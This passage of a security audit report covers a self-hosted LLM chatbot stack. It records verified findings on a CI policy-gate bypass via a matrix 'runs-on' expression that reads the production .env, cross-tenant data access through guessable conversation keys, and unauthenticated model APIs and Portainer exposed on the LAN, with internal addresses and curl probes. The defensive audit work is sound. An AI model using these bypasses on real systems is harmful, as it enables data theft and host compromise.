*Verification.* Every API call returns exactly what the finding claims. `gh api repos/namanjain221995/personal-LLM-Chabot/branches/main/protection` => {"message":"Branch not protected","status":"404"}; `gh api .../rulesets` => []; `gh api .../environments` => one environment `production` with "protection_rules":[], "deployment_branch_policy":null, "can_admins_bypass":true. Against that, pipeline.yml:181-182 and :645-647 assert that branch protection references these check names, and ci_gate.py's whole docstring (:4-27, and pipeline.yml:649-667) is written around "branch protection treats a skipped required check as satisfied". I also confirmed the consequence chain: there is no .github/CODEOWNERS and no .github/dependabot.yml; `gh api .../collaborators` lists three accounts (namanjain221995 admin, diyapachori789, jayeshprajapati-sudo); DEPLOY_ON_PUSH is absent from `gh api .../actions/variables` (only DEPLOY_BRANCH=dev and DEPLOY_FULL=false), so by pipeline.yml:755-763 the kill switch is unset and every push to main deploys unattended.

*Exploitable today.* not an external attack — it needs write access, which the three collaborators have. Today a collaborator can merge a red PR into main, or push straight to main, and the box deploys it with no review and no approval gate. The deploy job's own `needs.ci-ok.result == 'success'` (pipeline.yml:756) still protects the box from deploying a red commit, so the harm is main carrying untested code plus an unattended production deploy.

*Fix.* Two settings changes, in this order: (1) add required reviewers and a `main`-only deployment-branch policy to the `production` environment, which alone converts every push-deploy into an approval click; (2) create a ruleset on main requiring the `CI passed` check and one PR review. Until those exist, correct the two comments at pipeline.yml:181-182 and :645-647 to say the protection is recommended and not configured — a comment asserting a control that does not exist is the load-bearing lie here.

*Fix risk.* Settings-only; nothing restarts. The one real risk is ordering: enabling the required check before a run has published the current check names blocks all merges until a run completes. Adding environment reviewers will pause in-flight deploys at the approval step rather than failing them.

### N021 — P4 is skipped entirely when `runs-on` is an expression: a matrix can smuggle `self-hosted` past the policy gate

**P1** · cicd · `.github/workflows/scripts/workflow_policy.py:171` · verdict **FOUND IN VERIFICATION**

*Evidence.* _runs_on_text (workflow_policy.py:82-90) returns the literal YAML text of `runs-on`, and check_file:171 does `if "self-hosted" not in _runs_on_text(job).lower(): continue` — so a job whose runs-on is `${{ matrix.runner }}` is treated as hosted and every P4 check (the no-pull_request rule AND the refs/heads/main rule) is skipped. It does not even need an `if:`. Reproduced: a one-job workflow with `on: [pull_request, push]`, `permissions: {}`, `runs-on: ${{ matrix.runner }}`, `strategy.matrix.runner: [ubuntu-latest, "self-hosted"]` and a step that cats the production .env gives `checked 1 workflow file(s): m.yml / workflow policy: OK (P1-P6) / EXIT=0`. The `self-hosted` label alone matches spark-0e68 (gh api .../actions/runners shows labels [self-hosted, Linux, ARM64, dgx-spark]). actionlint would not object either — .github/workflows/actionlint.conf only declares the `dgx-spark` label so a typo is caught, not an expression.

*Impact.* This is a cleaner bypass of the same gate F066 attacks, and it needs no trick condition at all — the reviewer-visible diff contains no `if:` to inspect and no `refs/heads/main` to misread. Coupled with F064 it is the lowest-effort way to get a job onto the production box while the `policy` job reports green. For the developer-platform build, where new matrix jobs are the likely shape of added CI, this is the gap most likely to be walked into by accident.

*Fix.* In workflow_policy.py, treat an expression in runs-on as a refusal rather than an exemption: if `_runs_on_text(job)` contains `${{`, fail P4 unless every possible value is resolvable (expand `strategy.matrix` for the referenced key and check each value). Simplest correct version: fail whenever runs-on is not a literal string or list of literal strings. Add m.yml as a unit test alongside the F066 evil.yml case. Static-analysis change on a hosted runner; no container, model or production window.

### F034 — Bare /chat calls write private document and page text under a conversation key any other user can claim, giving cross-tenant read and cross-tenant delete

**P1** · database · `orchestrator/app/main.py:1749` · verdict **ADJUSTED** · claimed P0 · blocks release

*Evidence.* main.py:1738-1739 builds the key for a call that carries no conversation_id: `scoped_session = f"u{viewer}-{request.session_id}"` / `conv_key_outer = request.conversation_id or scoped_session`. The claim-the-id guard immediately below runs ONLY inside `if request.conversation_id:` (main.py:1749-1770), whose comment says it exists to close 'the pre-seeding hole (nobody else can later create-and-inherit it)'. So a bare call never creates a `conversations` row, yet the per-conversation side tables are written under that key: `conv_key = request.conversation_id or scoped_session` (main.py:2466) is passed as `conversation_id=conv_key` to the document engine (main.py:3077 `run_pdf_engine_multi(... conversation_id=conv_key ...)` → `db.save_document`, engines/document.py:401) and to the URL engine (main.py:3138 `run_url_engine(text, url_list, conv_key, ...)` → `db.run_in_thread(db.save_url_document, conversation_id, url, ext.title, ext.text)`, engines/url.py:237-240). Those tables carry no owner column at all: `CREATE TABLE IF NOT EXISTS url_documents (id bigint …, conversation_id text NOT NULL, url text NOT NULL, title text NOT NULL, text text NOT NULL, …)` (db.py:201-210) and `CREATE TAB

*Impact.* Any authenticated user can read another user's uploaded document text and fetched page text, and can permanently delete that user's side-table rows, by sending one /chat request with `conversation_id="u<victim_user_id>-default"`. Victim user ids are small sequential integers (`users.id integer GENERATED BY DEFAULT AS IDENTITY`, db.py:96) and `default` is the literal default session_id, so nothing has to be guessed. This is the exact namespace the planned public /v1/responses API will live in — API clients have no conversation id — so shipping the developer platform on the current key scheme multiplies the exposure rather than introducing it.

*Verification.* Every cited line checks out. main.py:1738-1739 `scoped_session = f"u{viewer}-{request.session_id}"` / `conv_key_outer = request.conversation_id or scoped_session`; the claim guard at 1749-1770 is inside `if request.conversation_id:` so a bare call never creates a conversations row. main.py:2466 recomputes the same `conv_key` and it reaches db.save_document (engines/document.py via main.py:3077) and db.save_url_document (main.py:3138). db.py:201-210 (url_documents) and 215-224 (documents) have conversation_id text NOT NULL and no owner column; db.py:4209/4245 select on conversation_id alone; main.py:2603/2633 splice the result into the prompt. `u2-default` passes _CONVERSATION_ID_RE (main.py:212) and ChatRequest.session_id (main.py:648) has no validator. delete_conversation (db.py:3548-3574) checks ownership then wipes 17 _SIDE_TABLES (db.py:2356-2394, includes chat_requests, upload_sessions, query_traces). I also found a SECOND claim door the auditor missed: uploads.py:506-522 `_own` mints a conversations row for any unclaimed id, so the namespace can be squatted via POST /uploads/init without touching /chat. ADJUSTED only on reach: the impact paragraph says "any authenticated user can read another user's uploaded document text" unconditionally, but the victim must have used the bare path. Every shipped client sends a conversation_id — the browser mints one before the first send (frontend/components/ChatApp.tsx:1675-1679) and no script under scripts/ omits it — so today there is no victim traffic in that namespace.

*Exploitable today.* Partially. Precondition: an authenticated account (single-tenant, LAN/tailnet or the Cloudflare-tunnelled frontend) AND a victim who calls /chat with no conversation_id. No current client does that, so the read/delete has nothing to steal yet. What IS exploitable today with no precondition is the squat: any user can pre-claim `u<victim_id>-default` (via /chat or POST /uploads/init) so that the victim's first future bare call writes its documents into a conversation the attacker owns. Victim ids are small sequential integers (db.py:96).

*Fix.* Two lines in orchestrator/app/main.py: add a `session_id` field_validator using _CONVERSATION_ID_RE next to `_valid_intent_id` (main.py:710-715), and reject a client-supplied `conversation_id` matching `^u[0-9]+-` there too, so the synthetic namespace can never be named by a client. Apply the same rejection in uploads.py `_own` (uploads.py:506). The durable fix for the developer API is an owner column on documents/url_documents/uploads/repos/repo_chunks plus user_id in the accessor predicates, the way app/artifacts/db.py:273-288 already does it.

*Fix risk.* The validator is pure request parsing; the only behavioural change is a 422 for clients that were sending `u<n>-...` ids, and none exist. Orchestrator container restart only — no model restart, no production window. The owner-column version is a V34 migration and inherits the F038 statement-timeout caveat.

### N010 — GET /chat/salesforce/{id} and POST /chat/salesforce/cancel fail OPEN on unowned ids, and the bare-call key is permanently unowned — cross-user read of another user's pending Salesforce question

**P1** · database · `orchestrator/app/main.py:3552` · verdict **FOUND IN VERIFICATION**

*Evidence.* Both Salesforce state routes use the fail-open comparison `if owner is not None and owner != viewer:` (main.py:3552 for the GET, main.py:3587 for the cancel), unlike every other conversation-scoped route in the tree, which is strict `if owner is None or owner != ...` (uploads.py:340, 422, 445, 533; share_api.py:114; main.py:3758; video/api.py:161). The comment at main.py:3549-3551 justifies it: "a brand-new chat asks for starter options before its first message creates the row — that id has no state to leak". That premise is false for the synthetic bare-call namespace. main.py:2861 passes `conversation_id=conv_key` into sf_intel.run, and conv_key is `request.conversation_id or scoped_session` (main.py:2466) = `u{viewer}-{session_id}`, a key for which db.conversation_owner returns None FOREVER because the bare path never creates a conversations row. The payload then leaks real state: starter_options (engines/sf_intel.py:1096-1155) returns `pending.wire()` from sf_state.get_pending(conversation_id) and a `continue` option whose prompt is `f"Continue that analysis: {state.last_query_summary}"` read from sf_conversation_state by conversation_id alone (core/sf_intel/state.py:53-70 → db.

*Impact.* Any authenticated user can read another user's pending Salesforce clarification (which carries the original question) and their last query summary by GETting /chat/salesforce/u<victim_id>-default — with no claim, no write, and no trace, unlike F034 which requires taking ownership of the conversations row and is therefore visible. They can also destroy that pending clarification via the cancel route. Victim ids are small sequential integers and `default` is the literal session_id default. Same precondition as F034 (the victim must use the bare path, which the browser never does today), so it is latent now and live the moment the developer API — which by definition has no conversation_id — starts writing into that namespace.

*Fix.* Make both routes strict about the synthetic namespace without breaking the pre-first-message starter card: at main.py:3552 return the empty payload `{"enabled": ..., "options": [], "pending_clarification": None}` when `owner is None` instead of falling through to sf_intel.starter_options, and at main.py:3587 refuse (404) when `owner is None`. Combined with the F034 validator (rejecting client conversation_ids matching `^u[0-9]+-`), the synthetic key then becomes unreachable from a client entirely. Orchestrator container restart only; no model restart, no production window.

### F051 — The worker node's OCR and speech engines answer unauthenticated on the office LAN

**P1** · edge-devops · `compose/compose.whisper.yaml:33` · verdict **ADJUSTED** · claimed P0 · blocks release

*Evidence.* compose/compose.whisper.yaml:33 `WHISPER_BIND: "${WHISPER_BIND:-192.168.9.68}"` — a literal LAN address as the default — with `network_mode: host` at :52. compose/compose.ocr.yaml:41 `--host ${OCR_BIND:?...}` with `network_mode: host` at :81, and scripts/whisper.sh:122-125 derives the worker bind by reading `enP7s7` (the management LAN NIC) over ssh. The resulting addresses are recorded in .env:370-371 (`ASR_BASE_URL=http://192.168.9.68:30007/v1`, `ASR_BASE_URLS=...`) and .env:379 (`OCR_REMOTE_BASE_URL=http://192.168.9.68:30004/v1`), and .runtime/generated.env:101 carries `OCR_BASE_URL=http://192.168.9.68:30004/v1`.

*Impact.* Two more unauthenticated model APIs on the office LAN, on a node with no firewall. The OCR service is a full vLLM OpenAI-compatible server (baidu/Unlimited-OCR) that accepts arbitrary /v1/chat/completions with images, so it is unmetered VLM inference for anyone on the LAN; the ASR service accepts arbitrary audio uploads. Neither is behind the ts_session cookie, neither appears in the audit log, and neither is counted by the analytics console. The compose comments show the LAN bind is deliberate (it is how the head reaches the worker) — the mistake is that the management LAN, not a point-to-point link, was chosen, unlike the worker sentinel which correctly binds the RoCE address (compose/compose.cluster-worker.yaml:150-152, 191).

*Verification.* The facts are right; the P0 label is one notch too high. I re-probed: GET http://192.168.9.68:30004/v1/models -> 200 returning `{"id":"baidu/Unlimited-OCR",...,"max_model_len":8192}` (the auditor wrote 819..., it is 8192), and GET http://192.168.9.68:30007/health -> 200. Source confirmed: compose/compose.whisper.yaml:33 `WHISPER_BIND: "${WHISPER_BIND:-192.168.9.68}"` with `network_mode: host` at :52; compose/compose.ocr.yaml:41 `--host ${OCR_BIND:?...}` with `network_mode: host` at :81. .env:370-371 and :379 carry the LAN URLs. compose/whisper/server.py has no api-key, bearer or Authorization check anywhere — grep returns only tokenizer hits. The contrast the auditor draws is real and correct: compose/compose.cluster-worker.yaml:150-152 documents 'CLUSTER_WORKER_IP is the RoCE rail-A address ... Never the management LAN, never 0.0.0.0' and the sentinel follows it (SENTINEL_BIND: ${CLUSTER_WORKER_IP} at :196). Why P1 not P0: identical attacker position to F050 but materially smaller assets (an 8k-context OCR VLM and a whisper server), no access to the flagship model, no 1M context. The aggravator the auditor understated is the one that matters: per the project's own measurement, saturating EITHER Spark throttles chat because the main model is TP=2 across both — so unauthenticated OCR inference on the worker is a usable denial-of-service against production chat.

*Exploitable today.* Yes. Any host on 192.168.9.0/22 or the tailnet, unauthenticated, can run OCR/VLM inference and upload arbitrary audio. Not reachable from the internet.

*Fix.* Change the bind derivation in scripts/whisper.sh:122-125 and the equivalent in scripts/ocr.sh to prefer CLUSTER_WORKER_IP (the RoCE rail) over the enP7s7 management address, and replace the literal `192.168.9.68` default at compose/compose.whisper.yaml:33 with a required `${WHISPER_BIND:?...}` so a missing value fails closed the way OCR_BIND already does. Re-run both scripts to rewrite .env:370-371,379.

*Fix risk.* Restarts the OCR and whisper containers on the worker only — the main model pair is untouched, no production window needed. Watch two things: ASR_BASE_URLS at .env:371 lists both the worker and the head's 172.17.0.1:30007, and compose.yaml:189-193 warns that naming one of that pair in `environment:` without the other makes them disagree — rewrite both. And a rail-only bind means the OCR healthcheck and any operator curl from the management LAN stop working; use the rail address.

### F052 — Portainer is published on 0.0.0.0:9000 (and IPv6) with the Docker socket mounted — host-root-equivalent admin over the LAN

**P1** · edge-devops · `docker-compose.yml:1` · verdict **CONFIRMED** · blocks release

*Evidence.* `docker ps` row: `portainer  portainer/portainer-ce:latest  Up 2 days  8000/tcp, 9443/tcp, 0.0.0.0:9000->9000/tcp, [::]:9000->9000/tcp`. `docker inspect portainer` gives `Net=bridge Priv=false Ports={"9000/tcp":[{"HostIp":"0.0.0.0","HostPort":"9000"},{"HostIp":"::","HostPort":"9000"}]} Binds=["/var/run/docker.sock:/var/run/docker.sock","portainer_data:/data"]`. `curl -s -o /dev/null -w '%{http_code}' http://192.168.9.54:9000/` returns 307 — it is reachable from the LAN address. This container is NOT defined anywhere in the repo: it appears in no compose file (I cite docker-compose.yml only as the nearest first-party anchor; grep for "portainer" across compose.yaml, compose/*.yaml and docker-compose.yml returns nothing).

*Impact.* Portainer with /var/run/docker.sock is root on this host by design. Published on every interface including IPv6, its login page is the only thing between the office LAN and the ability to create a privileged container, mount /, read the pgdata volume, or exec into the orchestrator and dump the CLOUDFLARE_TUNNEL_TOKEN. A weak or default admin password, or any Portainer CVE, is a full host compromise of the box that is about to host a public developer API. It is also invisible to the deploy pipeline and to `techsara up`, so nothing in the project's own tooling will ever notice it or restart it correctly.

*Verification.* `docker inspect portainer` returns Ports={"9000/tcp":[{"HostIp":"0.0.0.0","HostPort":"9000"},{"HostIp":"::","HostPort":"9000"}]} and Binds=["/var/run/docker.sock:/var/run/docker.sock","portainer_data:/data"] — the socket is mounted read-WRITE. StartedAt 2026-09-10T16:36:48Z. GET http://192.168.9.54:9000/ -> 307 from the LAN address (I re-ran it). A case-insensitive grep for 'portainer' across every *.yaml/*.yml/*.py/*.sh in the worktree returns nothing, so the auditor is right that it is entirely outside the repo, the launcher and the deploy pipeline. One thing I add: because it binds 0.0.0.0 it is also reachable at every docker bridge gateway, so every container on the `application` network — cloudflared included — can reach the Portainer API, which matters for F059.

*Exploitable today.* Conditionally. Reaching the login page needs only LAN/tailnet position; turning that into host root needs a valid Portainer admin credential, a weak/default password, or an unpatched Portainer CVE (the image is `:latest`, unpinned, so its version is whatever was pulled on 2026-09-10). I did not attempt authentication.

*Fix.* `docker rm -f portainer` if it is not needed; otherwise recreate it with `-p 127.0.0.1:9000:9000` and reach it over Tailscale, and verify the admin password. If it is meant to stay, bring it into compose as a service bound to a `${TECHSARA_ADMIN_BIND_ADDRESS:-127.0.0.1}` so the launcher and deploy preflight can see it.

*Fix risk.* None to the application — Portainer is not a dependency of any compose service and the stack has run without it. No model restart, no production window. Removing it will break whoever has been using it as their container UI, so ask first.

### N017 — The unauthenticated model APIs sit on the same Docker network as the Cloudflare tunnel, so one dashboard line publishes them to the internet

**P1** · edge-devops · `compose/compose.published-dgx-spark.yaml:24` · verdict **FOUND IN VERIFICATION**

*Evidence.* compose/compose.cloudflare.yaml:36-37 states the invariant: the tunnel 'is NOT on `inference`: the tunnel has no business being able to see the model APIs.' That invariant is false in the running configuration. Because PUBLISH_MODEL_PORTS=true (.env:73), compose/compose.published-dgx-spark.yaml adds `application` to every auxiliary model service (lines 24-26, 31-33, 38-40, 45-47, 52-54), and `docker inspect` confirms it: sf-local-ai-vllm-router-1, sf-local-ai-vllm-embed-1 and sf-local-ai-vllm-reranker-1 are each on BOTH sf-local-ai_application and sf-local-ai_inference, while sf-local-ai-cloudflared-1 is on sf-local-ai_application. The main engine is reachable from that network too: `docker network inspect sf-local-ai_application` gives gateway 172.18.0.1, and `curl http://172.18.0.1:8000/v1/models` returns 200 because the engine binds 0.0.0.0 (F050). The tunnel's ingress is dashboard-only (F059), so the change needs no commit and no CI run.

*Impact.* A single Cloudflare ingress rule — `http://vllm-router:30002`, `http://vllm-ocr:30004`, or `http://172.18.0.1:8000` — puts an unauthenticated OpenAI-compatible model API on the public internet in seconds, with no diff, no reviewer and no deploy record. This is the mechanism by which api.techsarasolutions.com will be created for the developer platform, so the exposure change that matters most is made in the one place with no review. F059 names the risk in the abstract; nobody checked whether the tunnel could actually reach the model APIs, and it can. It also means the safety argument written into compose.cloudflare.yaml is no longer true, so a future reviewer will trust a stale comment.

*Fix.* Take `application` off the model services — the only stated reason for it is that Docker records an unreachable port binding for a container on an `internal: true` network, which is a debugging convenience, not a requirement. If publishing must stay, put cloudflared on its own network carrying nothing but `frontend`, so the tunnel physically cannot name a model service. Then restore the truth of the comment at compose/compose.cloudflare.yaml:36-37, and add the committed-ingress check from F059 so a drifted dashboard is caught by CI.

### F042 — The raw vLLM OpenAI endpoint listens on every host interface with no authentication

**P1** · inference-model-registry · `scripts/lib/cluster-common.sh:90` · verdict **ADJUSTED** · claimed P0 · blocks release

*Evidence.* `CLUSTER_API_BIND_ADDRESS="${CLUSTER_API_BIND_ADDRESS:-0.0.0.0}"` feeds `--host ${CLUSTER_API_BIND_ADDRESS}` in compose/compose.cluster-dgx-spark.yaml:40, and the head runs `network_mode: host` with `ports: !reset []` (compose/compose.cluster-dgx-spark.yaml:33-36). Live `docker inspect sf-local-ai-vllm-1` shows the command `... --host 0.0.0.0 --port 8000 --max-model-len 1000000 ...` with NO --api-key. `ss -ltn` shows `LISTEN 0 2048 0.0.0.0:8000`. Unauthenticated GET /v1/models returned HTTP 200 on 192.168.9.54 (office LAN), 10.100.184.1 and 10.100.185.1 (RoCE) and 100.94.16.2 (tailnet). /etc/ufw/ufw.conf shows ENABLED=no.

*Impact.* Anyone on the LAN or the tailnet can run unauthenticated, unmetered inference on the production model, read the model identity and filesystem path, and trivially deny service to every chat user: a single 1M-token prompt or a handful of concurrent requests saturates the TP=2 pair that the whole product depends on. All of the orchestrator's protection (breaker, admission lanes, queue, usage accounting) is bypassed, because none of it lives in vLLM. This is exactly the endpoint the developer-platform build promises never to expose, and it is already exposed.

*Verification.* Every element checks out. scripts/lib/cluster-common.sh:90 `CLUSTER_API_BIND_ADDRESS="${CLUSTER_API_BIND_ADDRESS:-0.0.0.0}"`; /home/techsphere/Documents/project/personal-LLM-Chabot/.runtime/generated.env has `CLUSTER_API_BIND_ADDRESS=0.0.0.0`; compose/compose.cluster-dgx-spark.yaml:33-40 is `network_mode: host` + `ports: !reset []` + `--host ${CLUSTER_API_BIND_ADDRESS}`. `docker inspect sf-local-ai-vllm-1` Cmd confirms `--host 0.0.0.0 --port 8000 --max-model-len 1000000` with NO --api-key and no VLLM_API_KEY in Config.Env. `ss -ltn` shows `LISTEN 0 2048 0.0.0.0:8000`. I ran `curl http://192.168.9.54:8000/v1/models` -> 200 with `{"id":"Qwen/Qwen3.6-35B-A3B-NVFP4","root":"/models/repos/nvidia--Qwen3.6-35B-A3B-NVFP4--491c2f1ea524","max_model_len":1000000}` and no credentials. /etc/ufw/ufw.conf ENABLED=no and `iptables -S` gave nothing usable without sudo, so there is no host filter. Only the severity is overstated: the given ground truth is that the public internet reaches this box solely through the Cloudflare tunnel to the frontend, so this is a LAN/tailnet exposure, not an internet one — P1, not P0.

*Exploitable today.* yes — precondition is a position on the office LAN (192.168.8.0/22), the RoCE fabric (10.100.184/185.x) or the tailnet (100.94.16.2). No credential, session or role needed; I demonstrated an unauthenticated 200 from the LAN address. Not reachable from the internet.

*Fix.* Do NOT set CLUSTER_API_BIND_ADDRESS=127.0.0.1 as the finding proposes — the orchestrator and sync-worker reach the engine as `vllm:host-gateway` (compose/compose.cluster-dgx-spark.yaml:152-157, OPENAI_BASE_URL=http://vllm:8000/v1), i.e. via the docker bridge 172.17.0.1, and the interview-analysis second tenant hits the same port over the RoCE address; a loopback bind takes the whole product down. Smallest correct fix is a host packet filter on tcp/8000: accept from 127.0.0.1, the docker bridge ranges (172.17-172.19.0.0/16) and 10.100.184.0/24 + 10.100.185.0/24, drop on enP7s7 and tailscale0. Belt-and-braces later: `--api-key` on the engine plus OPENAI_API_KEY in the orchestrator env (that one is a model restart).

*Fix risk.* The firewall rule needs no restart of anything — it is a host nftables/ufw change only, and it is reversible. The risk is cutting off a consumer you did not enumerate: the orchestrator (bridge), the sync-worker (bridge), the head's own probes (loopback), the engine-controller's canary (loopback), and the second-tenant pipeline on the worker (RoCE). Test each of those before persisting the rule. The --api-key variant WOULD need a vLLM head restart, i.e. a production window on the TP=2 pair — do that separately, not as the first move.

### F043 — The OCR model engine on the worker node is reachable unauthenticated on the LAN

**P1** · inference-model-registry · `compose/compose.ocr.yaml:41` · verdict **CONFIRMED** · blocks release

*Evidence.* `--host ${OCR_BIND:?OCR_BIND must be set; scripts/ocr.sh derives it from the node's management interface}` with `network_mode: host` (compose/compose.ocr.yaml:81); scripts/ocr.sh:287 writes `OCR_BIND=$bind` from the node's management interface. The orchestrator env has `OCR_BASE_URL=http://192.168.9.68:30004/v1`. Live: `curl http://192.168.9.68:30004/v1/models` returned 200 with `{"id":"baidu/Unlimited-OCR", ... "max_model_len":8192}` and no credentials.

*Impact.* A second raw model endpoint is open on the office LAN. It accepts arbitrary images and prompts, burns worker-node GPU that the main model's TP=2 pair shares, and is entirely outside the orchestrator's breaker/admission/usage path. The build's rule is that the public API never exposes OCR; today OCR is exposed without the public API at all.

*Verification.* compose/compose.ocr.yaml:41 is `--host ${OCR_BIND:?...}` and :81 is `network_mode: host` with an explicit comment that a port publish was deliberately rejected in favour of an in-process bind; scripts/ocr.sh passes OCR_BIND from the node's management interface (ocr_compose assignments, scripts/ocr.sh ~287). The live orchestrator env has `OCR_BASE_URL=http://192.168.9.68:30004/v1`, `OCR_REMOTE_BASE_URL` the same, and `OCR_REQUIRES_AUTHENTICATION=false`. I ran `curl http://192.168.9.68:30004/v1/models` from this host -> 200 with no credentials. Second unmetered engine, outside the breaker/admission/usage path, same as claimed.

*Exploitable today.* yes — same precondition as F042, a position on the office LAN. Anyone there gets free multimodal inference on user-facing GPU. Blast radius is smaller than F042 because the engine is capped (--gpu-memory-utilization 0.10, --max-num-seqs 8, 3 GiB KV), but saturating the worker Spark still throttles the main model, which is TP=2 across both nodes.

*Fix.* Same host-filter change as F042, applied on the worker node: drop tcp/30004 arriving on the worker's management interface, accept from loopback and from the head's addresses. If you prefer a config change, set OCR_BIND to the worker's RoCE address and OCR_BASE_URL/OCR_REMOTE_BASE_URL to match, so the head reaches it over the fabric instead of the 1 GbE LAN (this also fixes my M4 below).

*Fix risk.* The filter needs no restart. Changing OCR_BIND restarts only the sf-local-ai-worker OCR container (a sidecar, ~1 min, no main-model impact) but it must be changed in lockstep with OCR_BASE_URL in the orchestrator env or every OCR call fails; the orchestrator then needs a restart too. Verify with scripts/ocr.sh health and one real image, because /health cannot see a degenerate OCR prompt (known trap).

### F044 — A non-streaming LONG-lane request keeps the NORMAL lane closed for the whole generation, and NORMAL waiters behind a closure never time out

**P1** · inference-model-registry · `orchestrator/app/admission.py:424` · verdict **ADJUSTED** · blocks release

*Evidence.* In `run()`: `result = await op()` … `if stream: return _LaneStream(result, ticket)` … `await ticket.release()` (admission.py:420-427). The NORMAL lane is reopened only by `_Ticket.first_token()` (admission.py:283-288), which `release()` calls (admission.py:290-295). For `stream=False` there is no first chunk, so NORMAL stays `closed=True` from admission (admission.py:332-333) until the completion RETURNS. Meanwhile `Lane.acquire` explicitly refuses to count that time against a waiter's bound: `if self.closed: started += now - last` (admission.py:155-158), so NORMAL waiters wait indefinitely rather than being refused with reason=timeout. The module docstring only ever describes the streaming case ("until the long request's FIRST TOKEN", admission.py:24-26), and test_admission.py covers only the streaming path (test_a_long_request_waits_for_idle_without_closing_normal_and_holds_it_from_admission_to_first_token, line 230).

*Impact.* Any non-streaming main-model call whose prompt exceeds ADMISSION_LONG_THRESHOLD_TOKENS (131,072) — json_completion, chat_completion, chat_with_tools, used by Deep Research, the sf_intel planner, artifact composition, video fusion and best-of-N — silently blocks every other generation in the process for its entire duration. The read timeout is 4200 s live, so the worst case is a ~70-minute total stall with no rejection, no metric and no status line for the blocked callers. For the developer API this is a whole-platform availability cliff triggerable by one large background job.

*Verification.* The mechanism is exactly as described and I traced it end to end. orchestrator/app/admission.py:420-427: `result = await op()` … `if stream: return _LaneStream(result, ticket)` … `await ticket.release()`. NORMAL is closed at admission (_admit, admission.py:331-333 `await ls.normal.set_closed(True)`) and reopened only by `_Ticket.first_token()` (admission.py:283-288), which for a non-streaming call runs inside `release()` (admission.py:290-295) AFTER the completion returns — there is no first chunk to trigger it earlier. Lane.acquire defers the waiter's own bound while the lane is closed (admission.py:155-158 `if self.closed: started += now - last`), so no NORMAL waiter is ever refused with reason=timeout during the closure. Reachability is real, not theoretical: all non-streaming main-model calls go through `_primary_send` -> `_admission.run(..., stream=False)` (llm.py:228-240), and orchestrator/app/artifacts/compose.py:331-369 builds the compose prompt from `m.uploads_text` with NO character cap (only `m.sources` is capped, at 40,000 chars), so one Artifact Studio compose over a large uploaded document produces a >131,072-token non-streaming json_completion. LLM_REQUEST_TIMEOUT defaults to gen_wall_clock_s (config.py:1373-1374) and GEN_WALL_CLOCK_S=4200 live, so the worst-case closure is ~70 minutes. TWO details in the evidence are wrong, hence ADJUSTED rather than CONFIRMED: blocked callers are NOT silent — `run()` passes `on_wait` and `_say` emits NORMAL_LINE with how many are ahead (admission.py:404-408, 226-235) — and there IS a metric: `llm_admission_waiting` / `llm_admission_lane_active` are published on every state change (admission.py:_publish) and I see both in the live /metrics output. What is genuinely absent is the timeout rejection and any bound on the closure.

*Exploitable today.* yes, without any attacker — an ordinary signed-in user composing an artifact from a large upload, or a Deep Research turn, is enough. A malicious signed-in user can do it deliberately and repeatedly. No special network position; a valid ts_session is the only precondition.

*Fix.* In orchestrator/app/admission.py `run()`, stop tying the closure to the completion. Smallest version: for the non-streaming branch, run `op()` as a task and reopen NORMAL after a bounded prefill grace — add `ADMISSION_LONG_CLOSURE_MAX_S` (30-60 s is the right order; the closure exists to keep concurrent PREFILLS apart, not concurrent decodes) and call `ticket.first_token()` when it expires, regardless of whether the call has returned. Guard it so `release()` remains idempotent (it already is, via `self.released`). Add the missing test beside test_admission.py:230, which only covers the streaming path.

*Fix risk.* Orchestrator container restart only — no model restart, no production window. The risk of getting the grace wrong is reintroducing exactly the mixed concurrent-prefill shape that caused the 2026-09-11 GDN fault, so pick a grace that comfortably covers a 1M-token prefill or reopen on a prefill-completion signal rather than a timer if one is available. Re-run scripts/cluster-soak.py after the change.

### F045 — json_completion and chat_completion_with_reasoning never record token usage, so usage_events under-counts the main model

**P1** · inference-model-registry · `orchestrator/app/llm.py:1140` · verdict **CONFIRMED** · blocks release

*Evidence.* `resp = await _primary_send(client, base, what="json_completion", ...)` then `_note_truncation(resp, schema_name, budget)` and `return resp.choices[0].message.content or ""` — `_capture_usage(resp)` is never called (same on the guided branch, llm.py:1124-1126). `_note_truncation` even reads `usage.completion_tokens` for a log line and discards it (llm.py:1155-1161). `chat_completion_with_reasoning` likewise returns `split_reasoning(resp.choices[0].message, ...)` with no `_capture_usage` (llm.py:505-519). Grep confirms `_capture_usage` appears only at llm.py:452, 557, 857, 898, 1048, 1239. There are 11 first-party `llm.json_completion(` call sites (deep_research x4, core/sf_intel/planner x2, core/sf_intel/resume, core/best_of, artifacts/compose, video/fusion x2).

*Impact.* `llm.get_usage()` — the number written to usage_events.input_tokens/output_tokens by _record_usage_event (main.py:490-491) and shown in the analytics console — omits every guided-JSON call and every best-of-N candidate. A Deep Research turn or an Artifact Studio compose can spend tens of thousands of main-model tokens that are invisible. If the developer platform bills or enforces quotas on these counters, usage is systematically under-reported and a caller can drive real GPU cost through the unmeasured paths.

*Verification.* orchestrator/app/llm.py:1124-1126 and 1139-1141 both do `resp = await _primary_send(...)` then `_note_truncation(resp, schema_name, budget)` then `return resp.choices[0].message.content or ""` — no `_capture_usage(resp)`. `_note_truncation` (llm.py:1144-1162) even reads `usage.completion_tokens` for its log line and discards it. `chat_completion_with_reasoning` ends at llm.py:519 with `return split_reasoning(resp.choices[0].message, ...)` and no capture. `grep -n _capture_usage orchestrator/app/llm.py` returns only 112 (the definition), 452, 557, 857, 898, 1048, 1239 — and 452/1048 are the chat_completion and chat_with_tools paths, which DO capture, so the asymmetry is real and not a middleware capture I missed. The value is the one that reaches the ledger: `_record_usage` writes the `_usage` ContextVar (llm.py:101-109) that `get_usage()` returns, and main.py:490-491 passes `tokens.get("prompt_tokens")` / `tokens.get("completion_tokens")` straight into `usage.record_async`. The 11 first-party json_completion call sites are real (deep_research.py:841/1380/1685/1846, core/sf_intel/planner.py:240/385, core/sf_intel/resume.py:247, core/best_of.py:137, artifacts/compose.py:378, video/fusion.py:263/274).

*Exploitable today.* Not an attack today — it is silent under-counting in analytics. It becomes exploitable the moment quotas or billing read usage_events: a caller who drives Deep Research, Artifact compose or best-of-N spends real GPU that never appears on the ledger, and no credential or network position is needed beyond a valid account.

*Fix.* Add `_capture_usage(resp)` on the line before each `_note_truncation(resp, ...)` in both json_completion branches (llm.py:1125 and llm.py:1140) and immediately after the `wait_for` in chat_completion_with_reasoning (llm.py:509, before the `return`). Three lines. Add the unit test the finding suggests, asserting `get_usage()["calls"]` increments for a usage-bearing json_completion response.

*Fix risk.* Orchestrator container restart only. Behaviourally inert except that reported token totals go UP — brief the analytics owner first or the jump will read as a regression. Note this fix is necessary but not sufficient for a billing-grade counter: see M3 below, where one 400 turns streaming usage off process-wide.

